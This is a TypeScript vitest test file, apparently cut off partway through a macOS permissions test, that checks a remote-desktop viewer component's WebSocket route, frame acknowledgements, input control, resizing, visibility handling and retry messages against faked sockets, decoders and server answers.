// Ways the Desktop viewer can fail, each covered below against the real
// viewer and its voxl client (only the browser transports, the decoder, and
// dx Core's answers are faked):
// - it opens a socket anywhere but dx Core's authenticated Thread route, or
//   with the wrong scheme, channel, or subprotocol;
// - it opens a socket before Core says the desktop is ready, or keeps
//   retrying (waking the workspace each time) when Core refuses: it spins
//   instead of saying the workspace has no Desktop or offering a retry;
// - it never acknowledges frames or answers pings, so voxl stalls its stream;
// - an open, untouched Desktop tab keeps the workspace awake forever;
// - the remote clipboard replaces the local one without the person's own
//   key press or click on the desktop while holding control, or a paste
//   echoes back as a copy;
// - it sends input while it does not hold control (focus), maps clicks to
//   the wrong desktop pixel, or lets the desktop's keys reach dx shortcuts;
// - it asks for a desktop size that does not follow the pane, or below the
//   usable minimum;
// - the phone's on-screen keys and keyboard type nothing, or the wrong keys;
// - it connects while its tab is hidden, the right pane is collapsed, or the
//   document is hidden, or it keeps its socket open more than a minute after
//   any of those (or drops it at once, so coming back reconnects);
// - it reconnects to the previous Thread after the Thread changes;
// - it hangs on a spinner when its chunk fails to load or the browser cannot
//   decode the stream, instead of saying so and offering a retry that can
//   succeed;
// - the Desktop tab is missing beside Terminal or connects before selection;
// - it shows the desktop as live before a picture is drawn, with nothing
//   covering the black canvas, so a click there reaches the remote screen
//   unseen;
// - it waits forever on a stream that opens but draws nothing;
// - a window closed or minimized on the desktop has no way back: the app
//   row is missing, does not say which apps are open, starts a second app
//   instead of bringing the open one forward, leaves keyboard control off
//   the desktop after a click, never notices a window closed on the
//   desktop, or shows (and fails) on an Orb whose daemon predates it;
// - a Mac runner's window mode: the window list is missing or shows the
//   Linux app row, a choice does not reach voxl or switches nothing, the
//   viewer still asks to resize the Mac while a window streams, a closed
//   window leaves the picker stale, the Desktop sends input before the
//   person turns Control on, or a notice covers the stream;
// - a Mac without Screen Recording for dx shows a bare log and a Retry the
//   person has to keep pressing, its "Open on your Mac" reaches no route or
//   the wrong pane, a Mac offline goes unsaid, it never notices the grant
//   (or opens a socket before it), or a missing Accessibility blocks the
//   stream;
// - a 4401 close the Orb chose (dxd forwards guest close codes) signs the
//   person out and wipes their drafts while their session is still valid,
//   or Core's own 4401 for a session that really ended does not.

import type {
  DesktopWindow,
  MacDesktopPermissions,
  MacDesktopWindow,
} from "@dx/api";
import type { ThreadId } from "@dx/domain";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import * as React from "react";
import { createRoot } from "react-dom/client";
import {
  afterEach,
  beforeAll,
  beforeEach,
  describe,
  expect,
  it,
  vi,
} from "vitest";
import { userEvent } from "vitest/browser";
import "../../styles.css";
import { onSessionEnded } from "../../shared/auth/session-ended.js";
import { PaneTreeHarness } from "../../testing/pane-tree-harness.js";
import { DesktopViewer } from "./desktop-viewer.js";

// Toasts the viewer shows, in order (sonner renders nothing without its Toaster).
const toasts = vi.hoisted(() => [] as string[]);
vi.mock("sonner", async (importOriginal) => {
  const original = await importOriginal<typeof import("sonner")>();
  const record = (message: unknown) => {
    toasts.push(String(message));
    return 0;
  };
  return {
    ...original,
    toast: Object.assign(record, {
      error: record,
      warning: record,
      success: record,
      info: record,
    }),
  };
});

// The browser session check the viewer asks before signing out.
const browserSession = vi.hoisted(() => ({
  current: { user: { id: "usr_1", name: "Alice", email: "a@x.test" } } as {
    user: { id: string; name: string; email: string };
  } | null,
  checks: 0,
}));
vi.mock("../../shared/auth/auth-client.js", async (importOriginal) => ({
  ...(await importOriginal<
    typeof import("../../shared/auth/auth-client.js")
  >()),
  getBrowserSession: async () => {
    browserSession.checks += 1;
    return browserSession.current;
  },
}));

Object.assign(globalThis, { IS_REACT_ACT_ENVIRONMENT: true });

class FakeSocket extends EventTarget {
  static readonly CONNECTING = 0;
  static readonly OPEN = 1;
  static readonly CLOSING = 2;
  static readonly CLOSED = 3;
  static instances: FakeSocket[] = [];
  readonly sent: unknown[] = [];
  readyState = FakeSocket.CONNECTING;
  binaryType = "blob";
  constructor(
    readonly url: string,
    readonly protocols?: string | string[],
  ) {
    super();
    FakeSocket.instances.push(this);
  }
  send(value: unknown) {
    this.sent.push(value);
  }
  close() {
    if (this.readyState === FakeSocket.CLOSED) return;
    this.readyState = FakeSocket.CLOSED;
    this.dispatchEvent(new CloseEvent("close", { code: 1000 }));
  }
  open() {
    this.readyState = FakeSocket.OPEN;
    this.dispatchEvent(new Event("open"));
  }
  /** Core refused the upgrade: the browser sees only a failed socket. */
  refuse() {
    this.readyState = FakeSocket.CLOSED;
    this.dispatchEvent(new Event("error"));
    this.dispatchEvent(new CloseEvent("close", { code: 1006 }));
  }
  receive(message: unknown) {
    this.dispatchEvent(
      new MessageEvent("message", { data: JSON.stringify(message) }),
    );
  }
  receiveBinary(data: ArrayBuffer) {
    this.dispatchEvent(new MessageEvent("message", { data }));
  }
  /** Text commands sent so far. */
  commands() {
    return this.sent.filter(
      (message): message is string => typeof message === "string",
    );
  }
}

/**
 * A WebCodecs decoder that, like a real one, decodes nothing until it has a
 * key frame, and outputs each frame after the current task.
 */
class FakeVideoDecoder {
  static decoded: string[] = [];
  state = "unconfigured";
  decodeQueueSize = 0;
  #keyed = false;
  constructor(
    private readonly init: {
      output: (frame: unknown) => void;
      error: (error: Error) => void;
    },
  ) {}
  configure() {
    this.state = "configured";
  }
  reset() {
    this.state = "unconfigured";
    this.#keyed = false;
  }
  close() {
    this.reset();
    this.state = "closed";
  }
  decode(chunk: EncodedVideoChunk) {
    FakeVideoDecoder.decoded.push(chunk.type);
    setTimeout(() => {
      if (this.state === "closed") return;
      if (chunk.type === "key") this.#keyed = true;
      if (!this.#keyed) return;
      this.init.output({
        displayWidth: 1280,
        displayHeight: 720,
        timestamp: chunk.timestamp,
        close() {},
      });
    }, 0);
  }
}

/** voxl's hello: the desktop's size, its one stripe, and dynamic resolution. */
const hello = (w = 1280, h = 720, resize = true) => ({
  t: "hello",
  w,
  h,
  os: "linux",
  audio: false,
  stripes: [[0, h]],
  ...(resize ? { resize: { scale: 1 } } : {}),
});

/** A Mac's voxl hello: its display, or in window mode the window it streams. */
const macHello = (window?: MacDesktopWindow) => ({
  t: "hello",
  w: window === undefined ? 1280 : window.frame.w * 2,
  h: window === undefined ? 720 : window.frame.h * 2,
  os: "macos",
  audio: false,
  stripes: [[0, window === undefined ? 720 : window.frame.h * 2]],
  // Dynamic resolution is off while a window streams.
  ...(window === undefined ? { resize: { scale: 1 } } : {}),
  displays: {
    selected: 1,
    available: [{ id: 1, name: "Display 1 · Main" }],
    ...(window === undefined
      ? {}
      : { window: { id: window.id, app: window.app, title: window.title } }),
  },
});

/** One voxl video message: type byte, 15 header bytes, then H.264. */
const videoFrame = (key: boolean, id: number) => {
  const bytes = new Uint8Array(16 + 8);
  bytes[0] = 0x01;
  bytes[1] = key ? 1 : 0;
  new DataView(bytes.buffer).setUint32(2, id);
  bytes[10] = 0; // stripe
  bytes[12] = 1; // parts
  return bytes.buffer;
};

/** What voxl sends a new viewer: its hello, then a full picture and frames since. */
const sendPicture = (socket: FakeSocket, frames = 3, from = 1) => {
  socket.receive(hello());
  for (let index = 0; index < frames; index += 1)
    socket.receiveBinary(videoFrame(index === 0, from + index));
};

let draws: ReturnType<typeof vi.fn>;
const roots: ReturnType<typeof createRoot>[] = [];

type DesktopAnswer =
  | "ready"
  | "unsupported"
  | "unavailable"
  | number
  /** A Mac runner's answer, with its own words. */
  | {
      readonly desktop: "ready" | "unavailable";
      readonly detail?: string;
      readonly permissions?: MacDesktopPermissions;
      readonly startsViewOnly?: boolean;
    };
let desktopAnswers: DesktopAnswer[] = [];
let desktopChecks: string[] = [];
/** The Desktop's windows as dx Core lists them, or its answer for an old daemon. */
let desktopWindows: DesktopWindow[] = [];
let windowsAnswer: "ready" | "unsupported" = "ready";
/** A Mac runner's windows (window mode); undefined on an Orb. */
let macWindows: MacDesktopWindow[] | undefined;
let windowRequests: Array<{ method: string; body?: unknown }> = [];
/** `POST .../desktop/settings` bodies, and Core's answer to the next one. */
let settingsRequests: unknown[] = [];
let settingsAnswer: { opened: boolean; detail?: string } = { opened: true };
/** What the guest does on `POST .../desktop/windows`. */
const actOnWindows = (action: { app?: string; window?: number }) => {
  desktopWindows = desktopWindows.map((window) => ({
    ...window,
    focused: false,
  }));
  const target =
    action.window !== undefined
      ? desktopWindows.find((window) => window.id === action.window)
      : desktopWindows.findLast((window) => window.app === action.app);
  if (target !== undefined) {
    Object.assign(target, { focused: true, minimized: false });
    return;
  }
  if (action.app === "terminal" || action.app === "browser")
    desktopWindows.push({
      id: 100 + desktopWindows.length,
      app: action.app,
      title: action.app === "terminal" ? "xterm" : "New Tab - Chromium",
      minimized: false,
      focused: true,
    });
};
/** dx Core's Desktop status check; answers in order, then `ready`. */
const fakeCore = async (input: RequestInfo | URL, init?: RequestInit) => {
  const url = new URL(String(input), window.location.href);
  if (url.pathname.endsWith("/desktop/settings")) {
    settingsRequests.push({
      method: init?.method,
      body: JSON.parse(String(init?.body)),
    });
    return Response.json({ status: "success", data: settingsAnswer });
  }
  if (url.pathname.endsWith("/desktop/windows")) {
    const method = init?.method ?? "GET";
    const body =
      typeof init?.body === "string" ? JSON.parse(init.body) : undefined;
    windowRequests.push({ method, ...(body === undefined ? {} : { body }) });
    if (method === "POST" && windowsAnswer === "ready") actOnWindows(body);
    return Response.json({
      status: "success",
      data:
        macWindows !== undefined
          ? { desktop: "ready", windows: [], macWindows }
          : windowsAnswer === "ready"
            ? { desktop: "ready", windows: desktopWindows }
            : { desktop: windowsAnswer, windows: [] },
    });
  }
  desktopChecks.push(url.pathname);
  const answer = desktopAnswers.shift() ?? "ready";
  return typeof answer === "number"
    ? new Response(JSON.stringify({ status: "error" }), { status: answer })
    : Response.json({
        status: "success",
        data: typeof answer === "string" ? { desktop: answer } : answer,
      });
};

const threadA = "thr_00000000-0000-4000-8000-000000000201" as ThreadId;
const threadB = "thr_00000000-0000-4000-8000-000000000202" as ThreadId;
let visibility: DocumentVisibilityState = "visible";

const setVisibility = async (state: DocumentVisibilityState) => {
  visibility = state;
  await React.act(async () => {
    document.dispatchEvent(new Event("visibilitychange"));
  });
};

const text = (container: HTMLElement) => container.textContent ?? "";
const button = (container: HTMLElement, label: string) =>
  [...container.querySelectorAll("button")].find((candidate) =>
    candidate.textContent?.includes(label),
  );
const openSockets = () =>
  FakeSocket.instances.filter(
    (socket) => socket.readyState !== FakeSocket.CLOSED,
  );
const desktopSocket = () => openSockets().at(-1) as FakeSocket;
const settle = () => React.act(async () => {});
// The viewer loads its client lazily; wait until it has opened its socket.
const connected = async () => {
  await vi.waitFor(() => expect(openSockets()).toHaveLength(1));
  await settle();
};
const surfaceOf = (container: HTMLElement) =>
  container.querySelector('[role="application"]') as HTMLElement;
/** Opens the socket and draws the first picture. */
const live = async (fakeTimers = false) => {
  const socket = desktopSocket();
  await React.act(async () => {
    socket.open();
    sendPicture(socket);
  });
  if (fakeTimers) await React.act(() => vi.advanceTimersByTimeAsync(20));
  await vi.waitFor(() => expect(draws).toHaveBeenCalled());
  await settle();
  return socket;
};

beforeAll(async () => {
  await import("./voxl/session.js");
});

beforeEach(() => {
  toasts.length = 0;
  visibility = "visible";
  Object.defineProperty(document, "visibilityState", {
    configurable: true,
    get: () => visibility,
  });
  Object.defineProperty(document, "hidden", {
    configurable: true,
    get: () => visibility === "hidden",
  });
  desktopAnswers = [];
  desktopChecks = [];
  desktopWindows = [];
  windowsAnswer = "ready";
  macWindows = undefined;
  windowRequests = [];
  settingsRequests = [];
  settingsAnswer = { opened: true };
  vi.stubGlobal("fetch", vi.fn(fakeCore));
  vi.stubGlobal("WebSocket", FakeSocket);
  FakeVideoDecoder.decoded = [];
  vi.stubGlobal("VideoDecoder", FakeVideoDecoder);
  vi.stubGlobal(
    "ResizeObserver",
    class {
      observe() {}
      disconnect() {}
    },
  );
  draws = vi.fn();
  vi.spyOn(HTMLCanvasElement.prototype, "getContext").mockReturnValue({
    drawImage: draws,
  } as unknown as RenderingContext);
});

afterEach(async () => {
  // A failed test leaves its viewer mounted; unmount it here so its sockets
  // do not leak into the next test.
  for (const root of roots.splice(0)) await React.act(() => root.unmount());
  vi.useRealTimers();
  document.body.replaceChildren();
  FakeSocket.instances = [];
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
});

let queryClient = new QueryClient();
/** The app's query client, as the Thread page provides it. */
const withQueries = (element: React.ReactElement) => (
  <QueryClientProvider client={queryClient}>{element}</QueryClientProvider>
);

const render = async (element: React.ReactElement) => {
  const container = document.body.appendChild(document.createElement("div"));
  const root = createRoot(container);
  roots.push(root);
  queryClient = new QueryClient();
  await React.act(() => root.render(withQueries(element)));
  await settle();
  return { container, root };
};

describe("DesktopViewer", () => {
  it("streams through one socket on dx Core's Thread desktop route", async () => {
    const { container, root } = await render(
      <DesktopViewer active threadId={threadA} />,
    );
    await connected();

    expect(openSockets().map((socket) => new URL(socket.url).pathname)).toEqual(
      [`/v1/threads/${threadA}/desktop/ws`],
    );
    for (const socket of FakeSocket.instances) {
      expect(socket.url.startsWith(`ws://${window.location.host}/`)).toBe(true);
      expect(socket.protocols).toBeUndefined();
    }
    expect(surfaceOf(container)).not.toBeNull();
    await React.act(() => root.unmount());
    expect(openSockets()).toEqual([]);
  });

  it("shows starting until the first picture is drawn, then the live desktop, then reconnecting compactly", async () => {
    const { container, root } = await render(
      <DesktopViewer active threadId={threadA} />,
    );
    await connected();
    expect(container.querySelector('[role="status"]')?.textContent).toContain(
      "Starting desktop",
    );

    const socket = desktopSocket();
    await React.act(async () => socket.open());
    // Connected, but nothing drawn yet: still starting.
    expect(container.querySelector(".thread-desktop-loading")).not.toBeNull();

    await React.act(async () => sendPicture(socket));
    await vi.waitFor(() => expect(draws).toHaveBeenCalled());
    await settle();
    expect(container.querySelector(".thread-desktop-loading")).toBeNull();
    expect(text(container)).not.toContain("Reconnecting");

    // The last picture stays on the canvas while the socket reconnects.
    await React.act(async () => {
      socket.readyState = FakeSocket.CLOSED;
      socket.dispatchEvent(new CloseEvent("close", { code: 1006 }));
    });
    expect(text(container)).toContain("Reconnecting");
    expect(container.querySelector(".thread-desktop-loading")).toBeNull();
    await React.act(() => root.unmount());
  });

  it("acknowledges every drawn frame and answers pings, as voxl paces its stream by them", async () => {
    const { root } = await render(<DesktopViewer active threadId={threadA} />);
    await connected();
    const socket = await live();
    await vi.waitFor(() =>
      expect(socket.commands()).toEqual(
        expect.arrayContaining(["v,1", "a,1", "a,2", "a,3"]),
      ),
    );
    expect(socket.commands()[0]).toBe("v,1");
    expect(FakeVideoDecoder.decoded[0]).toBe("key");

    await React.act(async () => socket.receive({ t: "ping", s: 4242 }));
    expect(socket.commands()).toContain("po,4242");
    await React.act(() => root.unmount());
  });

  it("covers the desktop until its first picture, so a click there never reaches the remote screen", async () => {
    const { container, root } = await render(
      <div style={{ display: "flex", width: 800, height: 500 }}>
        <DesktopViewer active threadId={threadA} />
      </div>,
    );
    await connected();
    const socket = desktopSocket();
    await React.act(async () => {
      socket.open();
      socket.receive(hello());
    });
    const surface = surfaceOf(container);
    const box = surface.getBoundingClientRect();
    const hit = document.elementFromPoint(
      box.left + box.width / 2,
      box.top + box.height / 2,
    );
    expect(hit?.closest(".thread-desktop-loading")).not.toBeNull();

    await userEvent.click(surface, { force: true });
    await settle();
    expect(document.activeElement).not.toBe(surface);
    expect(
      socket.commands().filter((command) => /^[mbk],/.test(command)),
    ).toEqual([]);
    await React.act(() => root.unmount());
  });

  it("sends input only while it holds control, at the desktop pixel under the pointer, and keeps its keys from dx shortcuts", async () => {
    const shortcut = vi.fn();
    window.addEventListener("keydown", shortcut);
    const { container, root } = await render(
      <div style={{ display: "flex", width: 1280, height: 900 }}>
        <DesktopViewer active threadId={threadA} />
      </div>,
    );
    await connected();
    const socket = await live();
    const surface = surfaceOf(container);
    const canvas = container.querySelector("canvas") as HTMLCanvasElement;
    // The app row takes the top of the pane once the windows are listed.
    await vi.waitFor(() =>
      expect(container.querySelector(".desktop-apps")).not.toBeNull(),
    );
    // The 1280x720 picture letterboxes in the canvas below the row, in two
    // equal bands.
    const box = canvas.getBoundingClientRect();
    expect(box.width).toBe(1280);
    const band = (box.height - 720) / 2;
    expect(band).toBeGreaterThan(0);
    const sent = () => socket.commands().filter((c) => /^[mbkr]/.test(c));

    // Without control, moving over the desktop sends nothing.
    await React.act(async () => {
      surface.dispatchEvent(
        new PointerEvent("pointermove", {
          bubbles: true,
          clientX: box.left + 640,
          clientY: box.top + band + 360,
        }),
      );
    });
    expect(sent()).toEqual([]);

    // A click there takes control and lands on the pixel under it.
    await React.act(async () => {
      for (const type of ["pointerdown", "pointerup"])
        surface.dispatchEvent(
          new PointerEvent(type, {
            bubbles: true,
            button: 0,
            pointerType: "mouse",
            clientX: box.left + 640,
            clientY: box.top + band + 360,
          }),
        );
    });
    expect(document.activeElement).toBe(surface);
    expect(sent()).toEqual(["m,640,360", "b,1,1", "b,1,0"]);

    await React.act(async () => {
      surface.dispatchEvent(
        new KeyboardEvent("keydown", { bubbles: true, code: "KeyA", key: "a" }),
      );
      surface.dispatchEvent(
        new KeyboardEvent("keyup", { bubbles: true, code: "KeyA", key: "a" }),
      );
    });
    expect(sent().slice(-2)).toEqual(["k,97,1", "k,97,0"]);
    expect(shortcut).not.toHaveBeenCalled();

    // Focus leaving the desktop ends control and lets every key go.
    await React.act(async () => surface.blur());
    expect(sent().at(-1)).toBe("r");
    window.removeEventListener("keydown", shortcut);
    await React.act(() => root.unmount());
  });

  it("asks for a desktop the size of the pane, at least a laptop's, and follows the pane", async () => {
    vi.unstubAllGlobals();
    vi.stubGlobal("fetch", vi.fn(fakeCore));
    vi.stubGlobal("WebSocket", FakeSocket);
    vi.stubGlobal("VideoDecoder", FakeVideoDecoder);
    const sizes = (socket: FakeSocket) =>
      socket.commands().filter((command) => command.startsWith("sz,"));
    const frame = document.body.appendChild(document.createElement("div"));
    frame.style.cssText = "display:flex;width:1400px;height:900px";
    const container = frame.appendChild(document.createElement("div"));
    container.style.cssText = "display:flex;flex:1";
    const root = createRoot(container);
    roots.push(root);
    await React.act(() =>
      root.render(withQueries(<DesktopViewer active threadId={threadA} />)),
    );
    await connected();
    const socket = desktopSocket();
    await React.act(async () => {
      socket.open();
      socket.receive(hello());
    });
    const density = Math.min(Math.max(window.devicePixelRatio, 1), 2);
    const expected = (w: number, h: number) => {
      const width = Math.round(w * density);
      const height = Math.round(h * density);
      return `sz,${width - (width % 8)},${height - (height % 2)}`;
    };
    await vi.waitFor(() =>
      expect(sizes(socket)).toEqual([expected(1400, 900)]),
    );

    // Narrower than a laptop: the desktop stays usable and letterboxes.
    frame.style.width = "600px";
    frame.style.height = "400px";
    await vi.waitFor(() =>
      expect(sizes(socket).at(-1)).toBe(expected(960, 540)),
    );

    // A server without dynamic resolution is never asked.
    await React.act(async () => {
      socket.receive(hello(1280, 720, false));
    });
    frame.style.width = "1200px";
    await new Promise((resolve) => setTimeout(resolve, 400));
    expect(sizes(socket)).toHaveLength(2);
    await React.act(() => root.unmount());
  });

  it("types from the phone's on-screen keys and keyboard", async () => {
    vi.stubGlobal("matchMedia", (query: string) => ({
      matches: query.includes("max-width"),
      media: query,
      addEventListener() {},
      removeEventListener() {},
    }));
    const { container, root } = await render(
      <DesktopViewer active threadId={threadA} />,
    );
    await connected();
    const socket = await live();
    const keys = () => socket.commands().filter((c) => c.startsWith("k,"));
    const toolbar = container.querySelector(
      '[role="toolbar"][aria-label="Desktop keys"]',
    ) as HTMLElement;
    expect(toolbar).not.toBeNull();

    // Esc takes control and presses Escape.
    await React.act(async () =>
      toolbar
        .querySelector<HTMLButtonElement>('[aria-label="Escape"]')
        ?.click(),
    );
    expect(keys()).toEqual(["k,65307,1", "k,65307,0"]);

    // The phone keyboard types into the hidden text input.
    await React.act(async () => button(container, "Keyboard")?.click());
    const input = container.querySelector(
      ".thread-desktop-text-input",
    ) as HTMLTextAreaElement;
    expect(document.activeElement).toBe(input);
    await React.act(async () => {
      input.value = " h";
      input.dispatchEvent(
        new InputEvent("input", { inputType: "insertText", data: "h" }),
      );
    });
    expect(keys().slice(-2)).toEqual(["k,104,1", "k,104,0"]);
    // The input keeps a character for the next Backspace to delete.
    expect(input.value).toBe(" ");

    // Ctrl, then c from the phone keyboard, sends Ctrl+C.
    await React.act(async () => button(container, "Ctrl")?.click());
    await React.act(async () => {
      input.dispatchEvent(
        new InputEvent("beforeinput", {
          inputType: "insertText",
          data: "c",
          cancelable: true,
        }),
      );
    });
    expect(keys().slice(-4)).toEqual([
      "k,65507,1",
      "k,99,1",
      "k,99,0",
      "k,65507,0",
    ]);
    await React.act(() => root.unmount());
  });

  it("reconnects a stream that opens but draws nothing", async () => {
    vi.useFakeTimers();
    const { container, root } = await render(
      <DesktopViewer active threadId={threadA} />,
    );
    await connected();
    const socket = desktopSocket();
    // dx Core's relay may not finish a close handshake the browser starts,
    // so a closed socket can stay closing for a long time.
    socket.close = () => {
      socket.readyState = FakeSocket.CLOSING;
    };
    await React.act(async () => {
      socket.open();
      // Only frames that depend on a full picture this viewer never got.
      socket.receive(hello());
      socket.receiveBinary(videoFrame(false, 1));
    });
    await React.act(() => vi.advanceTimersByTimeAsync(1_000));
    expect(draws).not.toHaveBeenCalled();
    // It asked for a full picture and still acknowledged the frame.
    expect(socket.commands()).toEqual(expect.arrayContaining(["kf", "a,1"]));
    expect(desktopSocket()).toBe(socket);

    await React.act(() => vi.advanceTimersByTimeAsync(10_000));
    const again = FakeSocket.instances.at(-1) as FakeSocket;
    expect(again).not.toBe(socket);
    expect(socket.readyState).toBe(FakeSocket.CLOSING);
    expect(container.querySelector(".thread-desktop-loading")).not.toBeNull();

    await React.act(async () => {
      again.open();
      sendPicture(again);
    });
    await vi.waitFor(async () => {
      await vi.advanceTimersByTimeAsync(20);
      expect(draws).toHaveBeenCalled();
    });
    await settle();
    expect(container.querySelector(".thread-desktop-loading")).toBeNull();
    await React.act(() => root.unmount());
  });

  it("connects only while shown, and keeps the stream a minute after it leaves the screen", async () => {
    vi.useFakeTimers();
    const { root } = await render(
      <DesktopViewer active={false} threadId={threadA} />,
    );
    await React.act(() => vi.advanceTimersByTimeAsync(5 * 60_000));
    expect(FakeSocket.instances).toEqual([]);

    await React.act(() =>
      root.render(withQueries(<DesktopViewer active threadId={threadA} />)),
    );
    await connected();
    const socket = desktopSocket();
    await React.act(async () => socket.open());
    const checks = desktopChecks.length;

    // Hidden briefly: the session stays, with its video paused meanwhile.
    await setVisibility("hidden");
    await React.act(() => vi.advanceTimersByTimeAsync(50_000));
    expect(openSockets()).toEqual([socket]);
    expect(socket.commands().slice(-2)).toEqual(["r", "v,0"]);
    await setVisibility("visible");
    expect(socket.commands().at(-1)).toBe("v,1");
    expect(desktopSocket()).toBe(socket);
    expect(desktopChecks).toHaveLength(checks);

    // Hidden for longer than the grace period: the stream ends.
    await setVisibility("hidden");
    await React.act(() => vi.advanceTimersByTimeAsync(61_000));
    expect(openSockets()).toEqual([]);
    await setVisibility("visible");
    await connected();

    // A collapsed pane or another tab keeps the socket for the minute.
    await React.act(() =>
      root.render(
        withQueries(<DesktopViewer active={false} threadId={threadA} />),
      ),
    );
    await React.act(() => vi.advanceTimersByTimeAsync(50_000));
    expect(openSockets()).toHaveLength(1);
    await React.act(() => vi.advanceTimersByTimeAsync(61_000));
    expect(openSockets()).toEqual([]);
    await React.act(() => root.unmount());
  });

  it("follows the Thread it is given", async () => {
    const { root } = await render(<DesktopViewer active threadId={threadA} />);
    await connected();
    await React.act(() =>
      root.render(withQueries(<DesktopViewer active threadId={threadB} />)),
    );
    await connected();
    expect(new URL(desktopSocket().url).pathname).toBe(
      `/v1/threads/${threadB}/desktop/ws`,
    );
    await React.act(() => root.unmount());
  });

  it("says when the browser cannot decode the desktop and retries on request", async () => {
    vi.stubGlobal("VideoDecoder", undefined);
    Reflect.deleteProperty(globalThis, "VideoDecoder");
    const { container, root } = await render(
      <DesktopViewer active threadId={threadA} />,
    );
    expect(FakeSocket.instances).toEqual([]);
    expect(container.querySelector(".thread-desktop-loading")).toBeNull();
    expect(text(container)).toContain("WebCodecs");

    vi.stubGlobal("VideoDecoder", FakeVideoDecoder);
    await React.act(async () => button(container, "Retry")?.click());
    await connected();
    await React.act(() => root.unmount());
  });

  it("reloads the page to retry a viewer that failed to load", async () => {
    // A failed dynamic import stays failed for the page, and a deployment
    // renames the chunk: only a reload can fetch it.
    const reload = vi.fn();
    const loadClient = vi.fn().mockRejectedValue(new Error("chunk failed"));
    const { container, root } = await render(
      <DesktopViewer
        active
        threadId={threadA}
        loadClient={loadClient}
        reloadPage={reload}
      />,
    );
    await vi.waitFor(() =>
      expect(text(container)).toContain("Desktop viewer failed to load."),
    );
    expect(FakeSocket.instances).toEqual([]);
    await React.act(async () => button(container, "Retry")?.click());
    expect(reload).toHaveBeenCalledTimes(1);
    await React.act(() => root.unmount());
  });

  it("asks Core to start the desktop before opening any socket", async () => {
    let answer: (response: Response) => void = () => undefined;
    const fetch = vi.fn(
      (_input: RequestInfo | URL, _init?: RequestInit) =>
        new Promise<Response>((resolve) => {
          answer = resolve;
        }),
    );
    vi.stubGlobal("fetch", fetch);
    const { container, root } = await render(
      <DesktopViewer active threadId={threadA} />,
    );
    expect(fetch).toHaveBeenCalledTimes(1);
    expect(fetch.mock.calls[0]?.[0]).toBe(`/v1/threads/${threadA}/desktop`);
    expect(fetch.mock.calls[0]?.[1]?.credentials).toBe("same-origin");
    expect(FakeSocket.instances).toEqual([]);
    expect(container.querySelector(".thread-desktop-loading")).not.toBeNull();

    await React.act(async () =>
      answer(Response.json({ status: "success", data: { desktop: "ready" } })),
    );
    await connected();
    await React.act(() => root.unmount());
  });

  it("says when the workspace has no Desktop and opens no socket", async () => {
    desktopAnswers = ["unsupported"];
    const { container, root } = await render(
      <DesktopViewer active threadId={threadA} />,
    );
    await vi.waitFor(() =>
      expect(text(container)).toContain(
        "Desktop isn't available in this workspace.",
      ),
    );
    expect(container.querySelector(".thread-desktop-loading")).toBeNull();
    expect(button(container, "Retry")).toBeUndefined();
    expect(FakeSocket.instances).toEqual([]);
    expect(desktopChecks).toHaveLength(1);
    await React.act(() => root.unmount());
  });

  it.each([
    [["unavailable", "unavailable"], "The desktop didn't start.", 3],
    [[503], "The desktop couldn't be reached.", 2],
    [[409], "Unarchive the Thread to use its desktop.", 2],
  ] as const)(
    "offers a retry when Core answers %s",
    async (answers, message, checks) => {
      desktopAnswers = [...answers];
      const { container, root } = await render(
        <DesktopViewer active threadId={threadA} />,
      );
      await vi.waitFor(() => expect(text(container)).toContain(message));
      expect(FakeSocket.instances).toEqual([]);

      await React.act(async () => button(container, "Retry")?.click());
      await connected();
      expect(desktopChecks).toHaveLength(checks);
      await React.act(() => root.unmount());
    },
  );

  it("shows a Mac runner's reason its Desktop did not start, asking once", async () => {
    const detail =
      "voxl is not installed on this Mac. Build it there with `cargo install voxl-server --root ~/.dx/runner/voxl`, then open the Desktop again.";
    desktopAnswers = [{ desktop: "unavailable", detail }];
    const { container, root } = await render(
      <DesktopViewer active threadId={threadA} />,
    );
    await vi.waitFor(() => expect(text(container)).toContain(detail));
    expect(desktopChecks).toHaveLength(1);
    expect(FakeSocket.instances).toEqual([]);
    expect(button(container, "Retry")).toBeDefined();
    await React.act(() => root.unmount());
  });

  describe("macOS permissions on a Mac runner", () => {
    const log =
      "macOS has not allowed dx to record this Mac's screen.\nERROR voxl: Screen Recording permission is missing";
    const refused = (accessibility: boolean) => ({
      desktop: "unavailable" as const,
      detail: log,
      permissions: { screenRecording: false, accessibility },
    });
    const rows = (container: HTMLElement) =>
      [
        ...container.querySelectorAll<HTMLElement>(
          '[aria-label="macOS permissions"] li',
        ),
      ].map((row) => row.textContent ?? "");
    const openOnMac = (container: HTMLElement, permission: string) =>
      [...container.querySelectorAll("button")].find(
        (candidate) =>
          candidate.textContent === `Open on your Mac for ${permission}`,
      );

    it("shows each permission, opens System Settings on the Mac, and streams by itself once allowed", async () => {
      vi.useFakeTimers();
      desktopAnswers = [
        refused(false),
        refused(false),
        {
          desktop: "ready",
          detail: "Clicks and typing are off.",
          permissions: { screenRecording: true, accessibility: false },
          startsViewOnly: true,
        },
      ];
      const { container, root } = await render(
        <DesktopViewer active threadId={threadA} />,
      );
      await vi.waitFor(() =>
        expect(text(container)).toContain("Allow dx to show this Mac"),
      );
      expect(rows(container)).toEqual([
        expect.stringMatching(/^Screen Recording\s*Needed/),
        expect.stringMatching(/^Accessibility\s*Needed/),
      ]);
      expect(text(container)).toContain("~/.dx/runner/dx.app");
      // No Retry to keep pressing, and voxl's log stays behind Details.
      expect(button(container, "Retry")).toBeUndefined();
      expect(text(container)).not.toContain("ERROR voxl");
      await React.act(async () => button(container, "Details")?.click());
      expect(
        container.querySelector<HTMLTextAreaElement>(
          'textarea[aria-label="Details"]',
        )?.value,
      ).toContain("ERROR voxl: Screen Recording permission is missing");
      expect(FakeSocket.instances).toEqual([]);

      await React.act(async () =>
        openOnMac(container, "Screen Recording")?.click(),
      );
      await vi.waitFor(() =>
        expect(text(container)).toContain(
          "System Settings is open on your Mac.",
        ),
      );
      settingsAnswer = {
        opened: false,
        detail: "This machine's runner is offline.",
      };
      await React.act(async () =>
        openOnMac(container, "Accessibility")?.click(),
      );
      await vi.waitFor(() =>
        expect(
          container.querySelector('[role="alert"]')?.textContent,
        ).toContain("This machine's runner is offline."),
      );
      expect(settingsRequests).toEqual([
        {
          method: "POST",
          body: { pane: "screen-recording" },
        },
        { method: "POST", body: { pane: "accessibility" } },
      ]);
      expect(desktopChecks).toHaveLength(1);

      // Checked again every few seconds: still refused, the rows stay
      // (with what the person did there).
      await React.act(() => vi.advanceTimersByTimeAsync(4_000));
